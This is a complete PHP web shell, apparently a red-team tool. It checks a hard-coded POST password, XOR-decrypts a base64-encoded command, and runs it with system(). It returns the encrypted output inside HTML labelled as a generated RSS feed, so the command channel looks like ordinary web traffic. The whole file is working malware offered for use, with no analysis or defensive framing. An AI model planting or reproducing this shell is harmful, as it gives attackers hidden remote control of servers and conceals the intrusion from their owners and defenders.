<?php

define('AUTH_KEY', '123456');
define('XOR_KEY', 'RedTeam2024');

echo "test";
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(404);
        exit;
}

if (!isset($_POST['auth']) || $_POST['auth'] !== AUTH_KEY){
        http_response_code(403);
        exit;
}

function xor_string($data, $key) {
    $output = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $output .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

if (!isset($_POST['data'])) {
    http_response_code(400);
    exit;
}

$encrypted = base64_decode($_POST['data']);
$command = xor_string($encrypted, XOR_KEY);

//$command = base64_decode($_POST['data']);


$result = system($command);

//  Zaszyfruj wynik
$encrypted_result = xor_string($result, XOR_KEY);
$encoded_result = base64_encode($encrypted_result);

//  Wyślij odpowiedź HTML z CDATA
header('Content-Type: text/html');
echo '<html><body>';
echo '<!-- RSS Feed Generated Successfully -->';
echo '<div id="rss"><![CDATA[' . $encoded_result . ']]></div>';
echo '</body></html>';

?>